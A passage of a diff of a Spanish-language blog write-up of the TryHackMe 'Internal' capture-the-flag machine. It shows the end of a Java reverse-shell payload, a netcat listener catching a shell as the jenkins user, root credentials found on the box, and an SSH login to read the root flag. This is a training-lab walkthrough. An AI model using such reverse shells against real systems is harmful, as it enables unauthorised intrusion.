style=color:#f92672>.</span><span style=color:#a6e22e>read</span><span style=color:#f92672>());</span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>si<span style=color:#f92672>.</span><span style=color:#a6e22e>available</span><span style=color:#f92672>()&gt;</span>0<span style=color:#f92672>)</span>po<span style=color:#f92672>.</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>si<span style=color:#f92672>.</span><span style=color:#a6e22e>read</span><span style=color:#f92672>());</span>so<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>po<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>sleep</span><span style=color:#f92672>(</span>50<span style=color:#f92672>);</span><span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>p<span style=color:#f92672>.</span><span style=color:#a6e22e>exitValue</span><span style=color:#f92672>();</span><span style=color:#66d9ef>break</span><span style=color:#f92672>;}</span><span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>){}};</span>p<span style=color:#f92672>.</span><span style=color:#a6e22e>destroy</span><span style=color:#f92672>();</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
-</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                                  ─╯
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                                  ─╯
 listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
 connect to <span style=color:#f92672>[</span>10.9.1.222<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.170.6<span style=color:#f92672>]</span> <span style=color:#ae81ff>53972</span>
 id
@@ -230,7 +369,9 @@ Will wanted these credentials secured behind the Jenkins container since we have
 need access to the root user account.
 
 root:<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
-</code></pre></div><p>SI! Shell reversa como <code>jenkins</code>!</p><p>Buscando nuevamente a traves de los directorios, encotré la contraseña de <code>root</code>!!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
+</code></pre></div><p>SI! Shell reversa como <code>jenkins</code>!</p>
+<p>Buscando nuevamente a traves de los directorios, encotré la contraseña de <code>root</code>!!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
 root@internal.thm<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: 
 Welcome to Ubuntu 18.04.4 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-112-generic x86_64<span style=color:#f92672>)</span>
 
@@ -261,7 +402,40 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Mon Aug  <span style=color:#ae81ff>3</span> 19:59:17 <span style=color:#ae81ff>2020</span> from 10.6.2.56
 root@internal:~# cat root.txt 
 <span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
-</code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=/es/posts/blueprint/><span class=button__icon>←</span>
-<span class=button__text>Blueprint - Write Up - Español</span></a></span>
-<span class="button next"><a href=/es/posts/thm-pre-security/><span class=button__text>Hackea Tu Forma De Aprender - THM</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user">Lanfran02</div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script></body></html>
+</code></pre></div><p>¡Y hemos rooteado la máquina!</p>
+<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Leer otros posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=/es/posts/blueprint/>
+<span class=button__icon>←</span>
+<span class=button__text>Blueprint - Write Up - Español</span>
+</a>
+</span>
+<span class="button next">
+<a href=/es/posts/thm-pre-security/>
+<span class=button__text>Hackea Tu Forma De Aprender - THM</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">Lanfran02</div>
+</div>
+</footer>
+<script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+</div>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+</body>
+</html>
